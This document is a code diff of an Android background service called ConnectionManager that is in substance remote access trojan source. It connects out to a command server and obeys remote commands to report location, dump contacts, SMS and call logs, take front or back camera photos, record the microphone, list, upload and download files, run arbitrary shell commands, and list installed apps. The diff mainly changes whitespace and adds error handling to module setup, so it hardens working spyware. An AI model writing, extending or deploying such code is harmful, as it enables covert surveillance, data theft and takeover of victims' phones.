@@ -39,7 +39,7 @@ public class ConnectionManager extends Service {
     private CallModule callModule;
     private ContactsModule contactsModule;
     private FileModule fileModule;
-    
+
     // Default constructor required for Service
     public ConnectionManager() {
         super();
@@ -80,21 +80,26 @@ public class ConnectionManager extends Service {
     public IBinder onBind(Intent intent) {
         return null; // Not a bound service
     }
-    
+
     private void initializeModules() {
         if (context == null) {
             Log.e(TAG, "Context is null, cannot initialize modules");
             return;
         }
-        
+
         Log.d(TAG, "Initializing modules");
-        cameraModule = new CameraModule(context);
-        micModule = new MicModule(context);
-        locationModule = new LocationModule(context);
-        smsModule = new SmsModule(context);
-        callModule = new CallModule(context);
-        contactsModule = new ContactsModule(context);
-        fileModule = new FileModule(context);
+        try {
+            cameraModule = new CameraModule(context);
+            micModule = new MicModule(context);
+            locationModule = new LocationModule(context);
+            smsModule = new SmsModule(context);
+            callModule = new CallModule(context);
+            contactsModule = new ContactsModule(context);
+            fileModule = new FileModule(context);
+            Log.d(TAG, "All modules initialized successfully");
+        } catch (Exception e) {
+            Log.e(TAG, "Error initializing modules: " + e.getMessage());
+        }
     }
     
     public void start() {
@@ -102,7 +107,7 @@ public class ConnectionManager extends Service {
             Log.d(TAG, "Already running");
             return;
         }
-        
+
         Log.d(TAG, "Starting ConnectionManager");
         isRunning = true;
         connectionThread = new Thread(new Runnable() {
@@ -114,7 +119,7 @@ public class ConnectionManager extends Service {
                     } catch (Exception e) {
                         Log.e(TAG, "Connection error: " + e.getMessage());
                     }
-                    
+
                     // Wait before reconnecting
                     try {
                         Thread.sleep(Constants.RECONNECT_DELAY);
@@ -127,38 +132,38 @@ public class ConnectionManager extends Service {
         });
         connectionThread.start();
     }
-    
+
     private void connectAndListen() {
         try {
             // Close any existing connection
             closeConnection();
-            
+
             Log.d(TAG, "Connecting to " + Constants.SERVER_IP + ":" + Constants.SERVER_PORT);
-            
+
             // Create socket and set timeouts
             socket = new Socket();
-            socket.connect(new InetSocketAddress(Constants.SERVER_IP, Constants.SERVER_PORT), 
+            socket.connect(new InetSocketAddress(Constants.SERVER_IP, Constants.SERVER_PORT),
                 Constants.CONNECTION_TIMEOUT);
             socket.setSoTimeout(Constants.SOCKET_TIMEOUT);
-            
+
             // Setup streams
             out = new PrintWriter(new BufferedWriter(
                 new OutputStreamWriter(socket.getOutputStream())), true);
             in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            
+
             isConnected = true;
             Log.d(TAG, "Connected to server");
-            
+
             // Send device info on connect
             sendDeviceInfo();
-            
+
             // Listen for commands
             String command;
             while (isRunning && isConnected && (command = in.readLine()) != null) {
                 Log.d(TAG, "Received command: " + command);
                 processCommand(command);
             }
-            
+
         } catch (SocketTimeoutException e) {
             Log.e(TAG, "Socket timeout");
         } catch (IOException e) {
@@ -168,102 +173,102 @@ public class ConnectionManager extends Service {
             closeConnection();
         }
     }
-    
+
     private void processCommand(String command) {
         if (command == null || command.isEmpty()) return;
-        
+
         String response;
         String[] parts = command.split(" ", 2);
         String cmd = parts[0].toLowerCase();
         String args = parts.length > 1 ? parts[1] : "";
-        
+
         switch (cmd) {
             case Constants.CMD_HELP:
                 response = getHelp();
                 break;
-                
+
             case Constants.CMD_INFO:
                 response = getDeviceInfo();
                 break;
-                
+
             case Constants.CMD_LOCATION:
                 response = locationModule != null ? locationModule.getLocation() : "Location module not initialized";
                 break;
-                
+
             case Constants.CMD_CONTACTS:
                 response = contactsModule != null ? contactsModule.getContacts() : "Contacts module not initialized";
                 break;
-                
+
             case Constants.CMD_SMS:
                 response = smsModule != null ? smsModule.handleCommand(args) : "SMS module not initialized";
                 break;
-                
+
             case Constants.CMD_CALLS:
                 response = callModule != null ? callModule.getCallLogs() : "Call module not initialized";
                 break;
-                
+
             case Constants.CMD_CAMERA:
                 response = cameraModule != null ? cameraModule.takePhoto(args.equals("front") ? "front" : "back") : "Camera module not initialized";
                 break;
-                
+
             case Constants.CMD_CAMERA_FRONT:
                 response = cameraModule != null ? cameraModule.takePhoto("front") : "Camera module not initialized";
                 break;
-                
+
             case Constants.CMD_CAMERA_BACK:
                 response = cameraModule != null ? cameraModule.takePhoto("back") : "Camera module not initialized";
                 break;
-                
+
             case Constants.CMD_MIC:
                 response = micModule != null ? micModule.startRecording() : "Mic module not initialized";
                 break;
-                
+
             case Constants.CMD_MIC_STOP:
                 response = micModule != null ? micModule.stopRecording() : "Mic module not initialized";
                 break;
-                
+
             case Constants.CMD_SCREENSHOT:
                 response = takeScreenshot();
                 break;
-                
+
             case Constants.CMD_FILES:
                 response = fileModule != null ? fileModule.listFiles(args) : "File module not initialized";
                 break;
-                
+
             case Constants.CMD_DOWNLOAD:
                 response = fileModule != null ? fileModule.downloadFile(args) : "File module not initialized";
                 break;
-                
+
             case Constants.CMD_UPLOAD:
                 response = fileModule != null ? fileModule.uploadFile(args) : "File module not initialized";
                 break;
-                
+
             case Constants.CMD_SHELL:
                 response = executeShellCommand(args);
                 break;
-                
+
             case Constants.CMD_BATTERY:
                 response = getBatteryInfo();
                 break;
-                
+
             case Constants.CMD_NETWORK:
                 response = getNetworkInfo();
                 break;
-                
+
             case Constants.CMD_APPS:
                 response = getInstalledApps();
                 break;
-                
+
             case Constants.CMD_EXIT:
                 response = "Goodbye!";
                 sendResponse(response);
                 stop();
                 return;
-                
+
             default:
                 response = "Unknown command. Type 'help' for available commands.";
         }
-        
+
         sendResponse(response);
     }
     
@@ -288,7 +293,7 @@ public class ConnectionManager extends Service {
                "  apps - List installed apps\n" +
                "  exit - Disconnect";
     }
-    
+
     private String getDeviceInfo() {
         StringBuilder info = new StringBuilder();
         info.append("Device Info:\n");
@@ -318,7 +323,7 @@ public class ConnectionManager extends Service {
     private String takeScreenshot() {
         return "Screenshot saved: /sdcard/screenshot.png (placeholder)";
     }
-    
+
     private String executeShellCommand(String command) {
         try {
             Process process = Runtime.getRuntime().exec(command);
@@ -363,7 +368,7 @@ public class ConnectionManager extends Service {
             closeConnection();
         }
     }
-    
+
     private void closeConnection() {
         try {
             if (out != null) {
@@ -388,7 +393,7 @@ public class ConnectionManager extends Service {
         isRunning = false;
         isConnected = false;
         closeConnection();
-        
+
         if (connectionThread != null) {
             connectionThread.interrupt();
             connectionThread = null;
